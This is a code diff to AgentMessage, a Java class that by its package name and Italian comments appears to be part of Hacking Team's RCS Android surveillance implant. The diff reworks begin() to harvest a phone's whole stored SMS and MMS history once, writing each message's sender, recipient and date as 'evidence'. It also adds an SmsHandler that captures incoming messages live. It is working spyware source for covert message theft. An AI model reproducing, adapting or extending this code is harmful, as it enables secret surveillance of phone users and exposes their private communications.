@@ -22,10 +22,10 @@ import com.ht.RCSAndroidGUI.Sms;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.agent.sms.MmsBrowser;
 import com.ht.RCSAndroidGUI.agent.sms.SmsBrowser;
-import com.ht.RCSAndroidGUI.event.EventType;
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
 import com.ht.RCSAndroidGUI.evidence.Markup;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
+import com.ht.RCSAndroidGUI.interfaces.SmsHandler;
 import com.ht.RCSAndroidGUI.listener.ListenerSms;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 import com.ht.RCSAndroidGUI.util.DateTime;
@@ -43,6 +43,7 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 	private final String TAG = "AgentMessage";
 
 	private static final int SMS_VERSION = 2010050501;
+	private SmsHandler smsHandler;
 
 	@Override
 	public void begin() {
@@ -51,38 +52,41 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 		Markup storedImsi = new Markup(AgentType.AGENT_SMS);
 
 		// Abbiamo gia' catturato lo storico
-		if (storedImsi.isMarkup() == true){
-			return;
+		if (storedImsi.isMarkup() == false) {
+			Log.d("QZ", TAG + " (begin): cattura sms di storico");
+
+			SmsBrowser smsBrowser = new SmsBrowser();
+			ArrayList<Sms> listSms = smsBrowser.getSmsList();
+			Iterator<Sms> iterSms = listSms.listIterator();
+
+			while (iterSms.hasNext()) {
+				Sms s = iterSms.next();
+				saveSms(s);
+			}
+
+			MmsBrowser mmsBrowser = new MmsBrowser();
+			ArrayList<Mms> listMms = mmsBrowser.getMmsList();
+			Iterator<Mms> iterMms = listMms.listIterator();
+
+			while (iterMms.hasNext()) {
+				Mms mms = iterMms.next();
+				mms.print();
+				saveMms(mms);
+			}
+
+			// Scriviamo il markup
+			storedImsi.writeMarkup(Utils.longToByteArray(System.currentTimeMillis()));
 		}
 
-		Log.d("QZ", TAG + " (begin): cattura sms di storico");
-		
-		SmsBrowser smsBrowser = new SmsBrowser();
-		ArrayList<Sms> listSms = smsBrowser.getSmsList();
-		Iterator<Sms> iterSms = listSms.listIterator();
-
-		while (iterSms.hasNext()) {
-			Sms s = iterSms.next();
-			saveSms(s);
-		}
-
-		MmsBrowser mmsBrowser = new MmsBrowser();
-		ArrayList<Mms> listMms = mmsBrowser.getMmsList();
-		Iterator<Mms> iterMms = listMms.listIterator();
-
-		while (iterMms.hasNext()) {
-			Mms mms = iterMms.next();
-			mms.print();
-			saveMms(mms);
-		}
-
-		// Scriviamo il markup
-		storedImsi.writeMarkup(Utils.longToByteArray(System.currentTimeMillis()));
+		// Iniziamo la cattura live
+		SmsHandler smsHandler = new SmsHandler();
+		smsHandler.start();
 	}
 
 	@Override
 	public void end() {
 		ListenerSms.self().detach(this);
+		smsHandler.quit();
 	}
 
 	@Override
@@ -123,9 +127,8 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 		byte[] body = WChar.getBytes(sms.getBody());
 		long date = sms.getDate();
 		boolean sent = sms.getSent();
-		
+
 		saveEvidence(address, body, date, sent);
-	
 	}
 
 	private void saveMms(Mms mms) {
@@ -134,17 +137,17 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 		long date = mms.getDate();
 		DateTime filetime = new DateTime(date);
 		boolean sent = mms.getSent();
-		
+
 		saveEvidence(address, subject, date, sent);
 	}
 
 	private void saveEvidence(String address, byte[] body, long date, boolean sent) {
 		DateTime filetime = new DateTime(new Date(date));
-	
+
 		String from, to;
-	
+
 		int flags;
-	
+
 		if (sent) {
 			flags = 0;
 			from = "local";
@@ -154,17 +157,17 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 			to = "local";
 			from = address;
 		}
-	
+
 		final int additionalDataLen = 48;
 		final byte[] additionalData = new byte[additionalDataLen];
-	
+
 		final DataBuffer databuffer = new DataBuffer(additionalData, 0, additionalDataLen);
 		databuffer.writeInt(SMS_VERSION);
 		databuffer.writeInt(flags);
 		databuffer.writeLong(filetime.getFiledate());
 		databuffer.write(Utils.padByteArray(from.getBytes(), 16));
 		databuffer.write(Utils.padByteArray(to.getBytes(), 16));
-	
+
 		new LogR(EvidenceType.SMS_NEW, additionalData, body);
 	}
 }
